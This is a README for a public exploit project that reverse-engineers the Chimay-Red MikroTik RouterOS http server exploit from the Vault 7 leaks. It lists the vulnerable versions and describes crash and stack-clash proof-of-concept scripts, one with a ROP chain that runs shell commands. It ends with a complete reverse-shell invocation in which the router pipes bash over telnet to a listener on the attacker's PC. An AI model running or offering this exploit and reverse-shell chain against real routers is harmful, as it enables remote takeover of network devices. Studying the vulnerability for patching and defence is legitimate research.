# Chimay-Red
Reverse engineering of Mikrotik exploit from Vault 7 CIA Leaks  

See the PDF for more info 

# Vulnerable versions  
Until RouterOS 6.38.4  

What's new in 6.38.5 (2017-Mar-09 11:32):  
!) www - fixed http server vulnerability;

# Proof of concepts
## CrashPOC  
Simple crash sending -1 as content-length in post header 

## StackClashPOC  
Stack clash exploit using two threads, missing ROP chain

## StackClashROPSystem  
Stack clash exploit using two threads  with ROP chain to run bash commands  

For a reverse shell:  
```
$ nc -l -p 1234
$ ./StackClashROPsystem.py 192.168.8.1 www_binary "mkfifo /tmp/f && /bin/telnet 192.168.8.5 1234 < /tmp/f | /bin/bash 
 > /tmp/f 2>&1"
```
Where:  
- RouterOS IP: 192.168.8.1  
- PC IP: 192.168.8.5  

(As the ROP is dynamically created, you have to extract the www binary from the RouterOS firmware, check that the running version is the same)
